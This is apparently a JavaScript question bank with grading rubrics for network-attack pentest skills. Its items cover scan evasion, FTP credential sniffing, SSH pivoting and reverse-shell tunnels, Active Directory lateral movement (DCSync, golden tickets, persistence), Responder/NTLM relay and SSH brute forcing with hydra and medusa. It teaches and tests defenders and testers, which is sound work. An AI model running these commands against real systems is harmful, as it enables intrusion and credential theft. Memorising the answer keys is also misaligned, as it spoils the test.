      { id: "decoy_fix", description: "Explains that the attacker's real IP is always in the decoy list and suggests using ME keyword or randomization", points: 2, keywords: ["ME", "RND", "real IP visible", "decoy position", "random order", "-D RND:10"], check: "The real source IP is always included; using -D RND:10,ME randomizes decoy positions. But the real IP still sends and receives the actual connection." },
      { id: "idle_scan_fix", description: "Explains that the zombie needs predictable IP IDs (incremental) and how to find a suitable zombie", points: 2, keywords: ["incremental IP ID", "predictable", "IPID", "zombie", "idle host", "IP ID sequence", "printer", "old OS"], check: "Idle scan requires a zombie with sequential/incremental IP IDs; randomized IDs make it unusable. Need to find an older device (printer, old Windows) with predictable IP IDs" },
      { id: "alternative_approach", description: "Suggests alternative enumeration when scanning is fully blocked", points: 2, keywords: ["DNS records", "OSINT", "certificate transparency", "Shodan", "web crawl", "application layer", "social engineering", "known ports only"], check: "Alternatives: OSINT/Shodan for historical scan data, DNS enumeration, certificate transparency logs, connecting to known ports directly, or using application-layer scanning (HTTP, DNS)" }
    ],
    gaps: [
      { if_missing: "fragment_issue", gap: "Does not understand that modern firewalls reassemble fragments, making simple fragmentation evasion ineffective" },
      { if_missing: "idle_scan_fix", gap: "Does not understand the IP ID predictability requirement for idle (zombie) scans" },
      { if_missing: "alternative_approach", gap: "Cannot adapt reconnaissance methodology when traditional port scanning is completely blocked" }
    ]
  }
},

// 9. Network sniffing (difficulty 3, trace_explain)
{
  competencyId: "net-attacks",
  subTopic: "network-sniffing",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `You capture the following traffic on a network during a pentest using tcpdump:

\`\`\`
$ tcpdump -i eth0 -A -s 0 'port 21'

15:30:01 IP 192.168.1.100.51234 > 192.168.1.10.21: Flags [S], seq 1000
15:30:01 IP 192.168.1.10.21 > 192.168.1.100.51234: Flags [S.], seq 2000, ack 1001
15:30:01 IP 192.168.1.100.51234 > 192.168.1.10.21: Flags [.], ack 2001
15:30:01 IP 192.168.1.10.21 > 192.168.1.100.51234: Flags [P.], ack 1001
  220 ProFTPD 1.3.5 Server ready.
15:30:05 IP 192.168.1.100.51234 > 192.168.1.10.21: Flags [P.], ack 2032
  USER admin
15:30:05 IP 192.168.1.10.21 > 192.168.1.100.51234: Flags [P.], ack 1013
  331 Password required for admin
15:30:08 IP 192.168.1.100.51234 > 192.168.1.10.21: Flags [P.], ack 2068
  PASS S3cur3P@ss!
15:30:08 IP 192.168.1.10.21 > 192.168.1.100.51234: Flags [P.], ack 1027
  230 User admin logged in
15:30:10 IP 192.168.1.100.51234 > 192.168.1.10.21: Flags [P.], ack 2092
  PORT 192,168,1,100,200,21
\`\`\`

1. What credentials were captured and why were they visible in plaintext?
2. What does the FTP PORT command at the end do? Decode the IP and port from "192,168,1,100,200,21".
3. You are capturing this traffic from a different machine (192.168.1.50) on the same network. Explain the network conditions that allow you to see this traffic (it's not addressed to you).
4. What protocols besides FTP commonly transmit credentials in plaintext?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "credentials", description: "Identifies the captured credentials: admin / S3cur3P@ss!", points: 1, keywords: ["admin", "S3cur3P@ss!", "USER", "PASS", "credentials", "username", "password"], check: "Extracts admin and S3cur3P@ss! from the USER and PASS commands" },
      { id: "plaintext_reason", description: "Explains that FTP transmits all data including credentials in cleartext (no encryption)", points: 2, keywords: ["plaintext", "cleartext", "no encryption", "FTP", "unencrypted", "protocol design"], check: "FTP by design transmits commands and data in cleartext; the protocol predates encryption and does not include any cipher negotiation" },
      { id: "port_decode", description: "Decodes PORT 192,168,1,100,200,21 as IP 192.168.1.100 port 51221 (200*256+21)", points: 2, keywords: ["200*256", "51221", "200 * 256 + 21", "data channel", "active mode", "PORT command", "high port"], check: "PORT format: first 4 numbers = IP, last 2 = port as (p1*256+p2). So 200*256+21 = 51221. This tells the server to connect back for data transfer." },
      { id: "sniffing_conditions", description: "Explains network conditions enabling sniffing: hub, MITM, monitor mode, promiscuous mode, span port", points: 2, keywords: ["promiscuous mode", "hub", "MITM", "ARP spoof", "SPAN port", "mirror", "monitor", "shared medium"], check: "Possible reasons: shared hub, SPAN/mirror port on switch, ARP spoofing already in place, or wireless monitor mode. Promiscuous mode on NIC is required." },
      { id: "other_plaintext", description: "Names at least 3 other protocols that transmit credentials in plaintext", points: 1, keywords: ["Telnet", "HTTP", "SMTP", "POP3", "IMAP", "SNMP", "LDAP", "rlogin"], check: "Lists protocols like Telnet, HTTP Basic Auth, POP3, IMAP, SMTP, SNMP (community strings), unencrypted LDAP" }
    ],
    gaps: [
      { if_missing: "port_decode", gap: "Cannot decode FTP PORT command format (IP as comma-separated octets, port as p1*256+p2)" },
      { if_missing: "sniffing_conditions", gap: "Does not understand the Layer 2 conditions required to sniff traffic on a switched network" },
      { if_missing: "plaintext_reason", gap: "Does not understand which protocols lack encryption and why credential sniffing is possible" }
    ]
  }
},

// 10. Port forwarding / pivoting (difficulty 3, fix_code)
{
  competencyId: "net-attacks",
  subTopic: "port-forwarding-pivot",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `You've compromised a dual-homed Linux server (Pivot Host) with interfaces on two networks:
- eth0: 10.10.10.20 (your attack network)
- eth1: 172.16.5.20 (internal network you want to reach)

You've discovered an internal web application at 172.16.5.100:8080 and an internal SSH server at 172.16.5.200:22. Your attack machine is 10.10.10.5.

A junior tester tried these commands but they don't work correctly:

**Attempt 1 - Local port forward to reach the web app:**
\`\`\`bash
# On attacker machine:
ssh user@10.10.10.20 -L 8080:8080
\`\`\`

**Attempt 2 - Dynamic port forward (SOCKS proxy):**
\`\`\`bash
# On attacker machine:
ssh user@10.10.10.20 -D 172.16.5.20:1080
\`\`\`

**Attempt 3 - Remote port forward to expose attacker's Metasploit handler internally:**
\`\`\`bash
# On pivot host:
ssh attacker@10.10.10.5 -R 4444:4444
\`\`\`

For each attempt:
1. Identify the syntax error or logical mistake
2. Provide the correct command
3. Explain the data flow (which machine binds which port, where traffic is forwarded)`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "local_forward_fix", description: "Fixes local forward syntax: -L local_port:remote_host:remote_port", points: 2, keywords: ["-L 8080:172.16.5.100:8080", "local_port:host:remote_port", "bind locally", "three parts"], check: "Correct: ssh user@10.10.10.20 -L 8080:172.16.5.100:8080 -- format is -L [bind_addr:]port:host:hostport" },
      { id: "dynamic_forward_fix", description: "Fixes dynamic SOCKS proxy: -D binds locally, not on remote. Should be -D 1080", points: 2, keywords: ["-D 1080", "-D localhost:1080", "SOCKS", "local bind", "proxy"], check: "Correct: -D 1080 binds a SOCKS proxy on the attacker's localhost:1080. The address in -D is the local bind address, not the remote." },
      { id: "remote_forward_fix", description: "Fixes remote forward syntax: -R remote_port:local_host:local_port", points: 2, keywords: ["-R 4444:10.10.10.5:4444", "-R 4444:localhost:4444", "bind on remote", "three parts"], check: "Correct: ssh attacker@10.10.10.5 -R 4444:localhost:4444 -- binds port 4444 on 10.10.10.5 and forwards back to pivot's localhost:4444, or the reverse direction depending on intent" },
      { id: "data_flow", description: "Clearly explains the data flow direction for at least one forwarding type", points: 2, keywords: ["binds", "listens", "forwards to", "tunnel", "through", "encrypted", "data flow"], check: "For local forward: attacker's machine listens on 8080, SSH tunnel to pivot, pivot connects to 172.16.5.100:8080. Traffic flows: attacker:8080 -> SSH tunnel -> pivot -> 172.16.5.100:8080" }
    ],
    gaps: [
      { if_missing: "local_forward_fix", gap: "Does not know the SSH local port forward syntax (-L bind_port:target_host:target_port)" },
      { if_missing: "dynamic_forward_fix", gap: "Confuses where -D binds the SOCKS proxy (locally vs remotely)" },
      { if_missing: "data_flow", gap: "Cannot trace the data flow through an SSH tunnel to explain which machine opens which connection" }
    ]
  }
},

// 11. Proxy chains / tunneling (difficulty 4, design_solution)
{
  competencyId: "net-attacks",
  subTopic: "proxychains-tunneling",
  questionType: "design_solution",
  difficulty: 4,
  questionText: `You are conducting a penetration test with the following network layout:

\`\`\`
Your Machine (10.10.10.5)
    |
    v
DMZ Server (10.10.10.100 / 172.16.1.100) -- compromised, have SSH access
    |
    v
Internal Server (172.16.1.50 / 192.168.100.50) -- compromised, have SSH access
    |
    v
Database Server (192.168.100.200) -- target, port 3306 open only from Internal Server's subnet
\`\`\`

Design a multi-hop pivoting solution to:
1. Access the database (port 3306) on 192.168.100.200 from your attack machine
2. Run an nmap scan against the 192.168.100.0/24 subnet from your attack machine
3. Set up a reverse shell listener that a payload on the Database Server can connect back to

For each objective, provide:
- The exact commands on each host
- The proxychains configuration if needed
- An explanation of why each tunnel is necessary
- What happens if one of the intermediate hosts goes down`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "multi_hop_tunnel", description: "Designs a working multi-hop SSH tunnel chain to reach 192.168.100.200:3306", points: 2, keywords: ["double tunnel", "multi-hop", "ProxyJump", "-J", "nested SSH", "chained", "two tunnels"], check: "Shows a valid two-hop tunnel: e.g., SSH from attacker to DMZ with -L, then SSH from DMZ to Internal with -L, or uses ProxyJump (-J)" },
      { id: "proxychains_config", description: "Provides correct proxychains configuration with SOCKS proxy chain", points: 2, keywords: ["proxychains", "socks4", "socks5", "1080", "strict_chain", "dynamic_chain", "proxychains.conf"], check: "Shows proxychains.conf with socks entries for each hop, and the corresponding -D flags on the SSH tunnels" },
      { id: "nmap_through_proxy", description: "Explains how to scan through proxychains and the limitations (TCP only, no SYN scan)", points: 2, keywords: ["proxychains nmap", "-sT", "TCP connect", "no SYN scan", "no UDP", "SOCKS limitation"], check: "Notes that proxychains only supports TCP connect scans (-sT), not SYN scans (-sS) or UDP, because SOCKS proxies operate at TCP level" },
      { id: "reverse_shell_setup", description: "Designs reverse shell connectivity back through the pivot chain", points: 2, keywords: ["reverse port forward", "-R", "socat", "relay", "callback", "reverse tunnel"], check: "Sets up remote port forwards (-R) at each hop so the DB server's reverse shell connects to Internal:port, which tunnels to DMZ:port, which tunnels to attacker:port" },
      { id: "failure_handling", description: "Addresses what happens when an intermediate host goes down and how to maintain persistence", points: 2, keywords: ["autossh", "reconnect", "persistent tunnel", "failure", "keepalive", "goes down", "session dies"], check: "Discusses using autossh or SSH keepalive options to auto-reconnect, or alternative persistence mechanisms like a cron-based tunnel script" }
    ],
    gaps: [
      { if_missing: "multi_hop_tunnel", gap: "Cannot design multi-hop SSH tunnels for reaching hosts across multiple network segments" },
      { if_missing: "nmap_through_proxy", gap: "Does not know the limitations of scanning through SOCKS proxies (TCP connect only, no raw packet techniques)" },
      { if_missing: "reverse_shell_setup", gap: "Cannot design reverse connectivity back through a multi-hop pivot chain" }
    ]
  }
},

// 12. Lateral movement (difficulty 4, design_solution)
{
  competencyId: "net-attacks",
  subTopic: "lateral-movement",
  questionType: "design_solution",
  difficulty: 4,
  questionText: `You've compromised a Windows workstation (WORKSTATION01, 10.10.10.50) in a corporate Active Directory environment. You have local admin credentials: CORP\\svc_backup / Backup2024!

From this workstation, you can see:
\`\`\`
$ crackmapexec smb 10.10.10.0/24
SMB  10.10.10.10  445  DC01       [*] Windows Server 2019 Build 17763 (domain:CORP)
SMB  10.10.10.20  445  FILESERV01 [*] Windows Server 2016 Build 14393
SMB  10.10.10.30  445  WEBSERV01  [*] Windows Server 2019 Build 17763
SMB  10.10.10.50  445  WKST01     [*] Windows 10 Build 19041

$ crackmapexec smb 10.10.10.0/24 -u svc_backup -p 'Backup2024!' --shares
SMB  10.10.10.10  445  DC01       [+] CORP\\svc_backup (admin on: ADMIN$, C$)
SMB  10.10.10.20  445  FILESERV01 [+] CORP\\svc_backup (admin on: ADMIN$, C$, Backups$)
SMB  10.10.10.30  445  WEBSERV01  [+] CORP\\svc_backup (no admin shares)
\`\`\`

Design a lateral movement strategy to:
1. Move to the file server (FILESERV01) and check for sensitive data
2. Attempt to escalate privileges toward the domain controller (DC01)
3. Maintain persistence on at least one compromised host

For each step, specify the exact tool and command, explain what artifacts it leaves (for OPSEC awareness), and suggest a less noisy alternative.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "lateral_technique", description: "Describes at least 2 lateral movement techniques (e.g., PsExec, WMI, WinRM, Pass-the-Hash)", points: 2, keywords: ["PsExec", "wmiexec", "WinRM", "smbexec", "Pass-the-Hash", "impacket", "evil-winrm", "DCOM"], check: "Names and explains multiple lateral movement techniques with their trade-offs" },
      { id: "fileserver_enum", description: "Plans enumeration of the file server for sensitive data", points: 2, keywords: ["shares", "Backups$", "smbclient", "sensitive", "credentials", "config files", "database backups", "search"], check: "Accesses Backups$ share on FILESERV01 and searches for credential files, database backups, config files with passwords" },
      { id: "dc_escalation", description: "Identifies the path from svc_backup to domain controller compromise", points: 2, keywords: ["domain admin", "DCSync", "Kerberoast", "Golden Ticket", "backup operator", "ntds.dit", "secretsdump", "privilege escalation"], check: "Notes that svc_backup has admin on DC01 and can potentially DCSync, dump ntds.dit, or extract credentials leading to domain admin" },
      { id: "opsec_awareness", description: "Identifies forensic artifacts left by at least 2 techniques", points: 2, keywords: ["event log", "4624", "service creation", "7045", "ADMIN$", "binary", "sysmon", "artifacts", "detection"], check: "Mentions artifacts: PsExec creates a service (Event 7045), WMI creates process (Event 4688), SMB logon events (Event 4624 type 3)" },
      { id: "persistence", description: "Describes a persistence mechanism with OPSEC considerations", points: 2, keywords: ["persistence", "scheduled task", "registry", "WMI subscription", "golden ticket", "backdoor", "DLL hijack"], check: "Proposes persistence: scheduled task, registry run key, WMI event subscription, or Kerberos golden ticket, with awareness of detection signatures" }
    ],
    gaps: [
      { if_missing: "lateral_technique", gap: "Knows only one lateral movement method; cannot choose the right technique based on OPSEC and access requirements" },
      { if_missing: "opsec_awareness", gap: "Performs lateral movement without considering the forensic artifacts and detection opportunities created" },
      { if_missing: "dc_escalation", gap: "Cannot identify privilege escalation paths from a compromised service account to domain admin" }
    ]
  }
},

// 13. Packet crafting with scapy (difficulty 4, compare_contrast)
{
  competencyId: "net-attacks",
  subTopic: "scapy-packet-crafting",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText: `Compare these three scapy scripts that each attempt to perform host discovery on a /24 subnet. Analyze the trade-offs of each approach:

**Script A: ICMP Ping Sweep**
\`\`\`python
from scapy.all import *

def icmp_sweep(subnet):
    ans, unans = sr(IP(dst=subnet)/ICMP(), timeout=2, verbose=0)
    for sent, received in ans:
        print(f"Host up: {received.src}")
\`\`\`

**Script B: TCP SYN to port 80**
\`\`\`python
from scapy.all import *

def tcp_sweep(subnet):
    ans, unans = sr(IP(dst=subnet)/TCP(dport=80, flags="S"), timeout=2, verbose=0)
    for sent, received in ans:
        if received.haslayer(TCP):
            if received[TCP].flags == 0x12 or received[TCP].flags == 0x14:
                print(f"Host up: {received.src}")
\`\`\`

**Script C: ARP Scan**
\`\`\`python
from scapy.all import *

def arp_sweep(subnet):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet), timeout=2, verbose=0)
    for sent, received in ans:
        print(f"Host up: {received.psrc} at {received.hwsrc}")
\`\`\`

1. Which script works on the local subnet only? Which works across routers? Explain why.
2. Which approach is most likely to be blocked by a host-based firewall? Which is hardest to block?
3. Script B checks for flags 0x12 and 0x14. What do these values mean, and why are both checked?
4. Modify Script A to detect hosts that block ICMP echo but respond to ICMP timestamp requests.
5. What is the difference between sr() and srp() and why does Script C require srp()?`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "local_vs_routed", description: "Explains that ARP is Layer 2 (local only) while ICMP and TCP are Layer 3 (routable)", points: 2, keywords: ["Layer 2", "Layer 3", "local subnet", "broadcast domain", "routable", "ARP not routed", "cannot cross router"], check: "ARP operates at Layer 2 and is not forwarded by routers, so Script C only works on the local subnet. ICMP and TCP are Layer 3 and can cross routers." },
      { id: "firewall_blocking", description: "Identifies ICMP as most commonly blocked and ARP as hardest to block", points: 2, keywords: ["ICMP blocked", "ping blocked", "ARP cannot block", "required for networking", "firewall rules", "host firewall"], check: "ICMP is most commonly blocked by firewalls; ARP is hardest to block because hosts need it to function on the network" },
      { id: "tcp_flags", description: "Decodes 0x12 as SYN-ACK (port open) and 0x14 as RST-ACK (port closed, but host is up)", points: 2, keywords: ["0x12", "SYN-ACK", "0x14", "RST-ACK", "RST", "open port", "closed port", "host alive"], check: "0x12 = SYN+ACK (port open), 0x14 = RST+ACK (port closed). Both prove the host is up, which is the goal of discovery." },
      { id: "icmp_timestamp", description: "Modifies Script A to use ICMP timestamp (type 13) instead of echo", points: 2, keywords: ["ICMP timestamp", "type 13", "type=13", "ICMPTimestamp", "alternate ICMP"], check: "Changes IP(dst=subnet)/ICMP() to IP(dst=subnet)/ICMP(type=13) or IP(dst=subnet)/ICMP(type='timestamp-request')" },
      { id: "sr_vs_srp", description: "Explains that sr() sends/receives at Layer 3 while srp() sends/receives at Layer 2 (raw Ethernet)", points: 2, keywords: ["sr Layer 3", "srp Layer 2", "Ethernet", "raw frame", "Ether header", "needs Layer 2"], check: "sr() works at Layer 3 (IP level), srp() works at Layer 2 (Ethernet level). ARP is a Layer 2 protocol that requires an Ethernet frame, hence srp() with Ether()." }
    ],
    gaps: [
      { if_missing: "local_vs_routed", gap: "Does not understand the fundamental difference between Layer 2 (ARP) and Layer 3 (ICMP/TCP) host discovery and their scope" },
      { if_missing: "tcp_flags", gap: "Cannot decode TCP flag bitmask values and does not understand that both SYN-ACK and RST indicate a live host" },
      { if_missing: "sr_vs_srp", gap: "Does not understand scapy's sr() vs srp() distinction and the OSI layer at which each operates" }
    ]
  }
},

// 14. Responder / LLMNR poisoning (difficulty 5, design_solution)
{
  competencyId: "net-attacks",
  subTopic: "responder-llmnr",
  questionType: "design_solution",
  difficulty: 5,
  questionText: `You are performing an internal penetration test in a Windows Active Directory environment. You have network access on the user VLAN (10.10.10.0/24). Your goal is to capture credentials and attempt to gain access to systems without triggering the SOC.

You plan to use Responder for LLMNR/NBT-NS poisoning, but you need to be strategic.

Design a complete attack plan that addresses:

1. **Pre-attack reconnaissance**: What should you check before running Responder? (Think: network config, existing defenses, timing)
2. **Selective poisoning**: Responder answers all broadcast queries by default. How would you target specific hosts or avoid poisoning critical infrastructure (domain controllers, monitoring systems)?
3. **Hash capture vs. relay**: You capture several NTLMv2 hashes. Compare two exploitation paths:
   - Path A: Crack the hashes offline (what tools, what wordlists, expected success rate)
   - Path B: Relay the hashes in real-time (what tool, what conditions must be met, what is the SMB signing situation)
4. **OPSEC considerations**: What logs and alerts will your attack generate? How would a blue team detect Responder? What can you do to minimize detection?
5. **Defensive countermeasures**: If you were advising the blue team after the engagement, what specific GPO settings and network configurations would you recommend to prevent this attack?`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "pre_recon", description: "Identifies pre-attack checks: LLMNR/NBT-NS enabled, SMB signing, network monitoring, timing", points: 2, keywords: ["LLMNR enabled", "NBT-NS enabled", "SMB signing", "network monitoring", "business hours", "DNS suffix", "WPAD"], check: "Checks: Is LLMNR/NBT-NS actually enabled? What is the SMB signing policy? Are there NDR/IDS systems? Best timing (business hours for traffic to blend in)" },
      { id: "selective_targeting", description: "Describes how to filter or target specific hosts with Responder", points: 2, keywords: ["filter", "targeted", "Responder.conf", "specific hosts", "avoid DC", "exclude", "analyze mode"], check: "Uses Responder's analyze mode first (-A), filters responses to avoid DCs and critical systems, potentially uses custom configuration" },
      { id: "crack_vs_relay", description: "Compares hash cracking (hashcat) vs. NTLM relay (ntlmrelayx) with conditions for each", points: 2, keywords: ["hashcat", "ntlmrelayx", "relay", "SMB signing", "mode 5600", "wordlist", "rules", "multirelay"], check: "Cracking: hashcat -m 5600 with wordlists+rules, success depends on password policy. Relay: ntlmrelayx requires SMB signing disabled on target, can get code execution." },
      { id: "opsec", description: "Identifies detection opportunities and OPSEC measures", points: 2, keywords: ["event log", "4648", "duplicate response", "IDS signature", "network anomaly", "multiple responses", "suspicious"], check: "Blue team detects: duplicate name resolution responses, Sysmon/EDR alerts, Event ID 4648 explicit credential use, NDR detecting LLMNR response from non-DNS server" },
      { id: "defense_recommendations", description: "Recommends specific GPO and network defenses", points: 2, keywords: ["GPO", "disable LLMNR", "disable NBT-NS", "SMB signing required", "EPA", "Extended Protection", "DNS suffix", "network segmentation"], check: "Recommends: GPO to disable LLMNR (Turn Off Multicast Name Resolution), disable NBT-NS via DHCP/registry, enable SMB signing, configure proper DNS suffix search list" }
    ],
    gaps: [
      { if_missing: "crack_vs_relay", gap: "Does not understand the strategic difference between offline hash cracking and real-time NTLM relay, or the conditions required for relay attacks" },
      { if_missing: "opsec", gap: "Runs attack tools without considering detection risks or how blue team monitoring would spot the activity" },
      { if_missing: "defense_recommendations", gap: "Cannot translate offensive knowledge into actionable defensive recommendations (GPO settings, network hardening)" }
    ]
  }
},

// 15. SSH exploitation and tunneling (difficulty 5, compare_contrast)
{
  competencyId: "net-attacks",
  subTopic: "ssh-exploitation",
  questionType: "compare_contrast",
  difficulty: 5,
  questionText: `You've found an SSH server during a pentest. Compare and evaluate the following attack and post-exploitation scenarios:

**Scenario 1 - Credential attacks:**
\`\`\`
$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.50 -t 4
$ medusa -h 10.10.10.50 -u root -P /usr/share/wordlists/rockyou.txt -M ssh -t 4
$ crackmapexec ssh 10.10.10.50 -u userlist.txt -p passlist.txt --no-bruteforce
\`\`\`

**Scenario 2 - Key-based access:**
You find a private key on a compromised web server:
\`\`\`
$ find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
/var/www/.ssh/id_rsa
/opt/deploy/deploy_key

$ ssh -i /var/www/.ssh/id_rsa admin@10.10.10.50
Enter passphrase for key '/var/www/.ssh/id_rsa': _
\`\`\`

**Scenario 3 - Post-exploitation tunneling:**
After gaining SSH access, you want to set up persistent access and pivot deeper. Compare:
- SSH tunneling (-L/-R/-D)
- sshuttle
- Chisel

Answer:
1. Compare hydra, medusa, and crackmapexec for SSH brute-forcing: speed, stealth, features, and OPSEC considerations. Which generates the most noise?
2. The private key has a passphrase. What are your options? Compare ssh2john + hashcat/john vs. other approaches.
3. Compare SSH native tunneling, sshuttle, and chisel for pivoting: when would you choose each? What are the technical limitations and prerequisites for each?
4. What SSH server configuration hardening (sshd_config) would prevent or mitigate each of these three scenarios?`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "brute_comparison", description: "Compares the three brute-force tools on speed, features, and detection footprint", points: 2, keywords: ["hydra", "medusa", "crackmapexec", "threads", "speed", "noise", "auth failures", "rate limiting", "fail2ban"], check: "Compares: hydra is fast but noisy, crackmapexec's --no-bruteforce tests credentials paired (less noise), all generate auth failure logs. CME has better credential management and output." },
      { id: "key_cracking", description: "Describes ssh2john + offline cracking approach for passphrase-protected keys", points: 2, keywords: ["ssh2john", "john", "hashcat", "passphrase", "offline", "key format", "PKCS8", "brute force key"], check: "Process: ssh2john converts the key to a hash format, then crack with john/hashcat. If key is old RSA format, easier to crack. PKCS8/OpenSSH format may need different mode." },
      { id: "tunnel_comparison", description: "Compares SSH tunneling, sshuttle, and chisel with clear use cases for each", points: 2, keywords: ["SSH tunnel", "sshuttle", "chisel", "VPN-like", "no root", "transparent", "SOCKS", "binary", "HTTP tunnel"], check: "SSH tunneling: built-in, per-port or SOCKS, no extra tools. sshuttle: VPN-like, transparent routing, needs root+Python on client. Chisel: single binary, works over HTTP/HTTPS, good when SSH isn't available." },
      { id: "sshd_hardening", description: "Specifies sshd_config settings that defend against each scenario", points: 2, keywords: ["PermitRootLogin", "PasswordAuthentication", "MaxAuthTries", "AllowUsers", "fail2ban", "pubkey only", "AuthenticationMethods"], check: "Scenario 1: PermitRootLogin no, MaxAuthTries 3, fail2ban. Scenario 2: restrict key permissions, AuthorizedKeysFile location, no key on web servers. Scenario 3: AllowTcpForwarding no, GatewayPorts no." },
      { id: "opsec_depth", description: "Discusses OPSEC implications beyond basic tool comparison", points: 2, keywords: ["auth log", "lastlog", "wtmp", "syslog", "connection logging", "key fingerprint", "known_hosts", "ssh-agent"], check: "Discusses: SSH login logged in auth.log/lastlog/wtmp, key fingerprints logged, known_hosts contamination on compromised host, ssh-agent forwarding risks" }
    ],
    gaps: [
      { if_missing: "tunnel_comparison", gap: "Cannot compare pivoting tools (SSH tunnels vs. sshuttle vs. chisel) and choose the right one based on the engagement constraints" },
      { if_missing: "sshd_hardening", gap: "Cannot map offensive SSH techniques to specific sshd_config defensive hardening measures" },
      { if_missing: "opsec_depth", gap: "Does not consider the full forensic trail left by SSH-based attacks (logs, key artifacts, session records)" }
    ]
  }
},
];
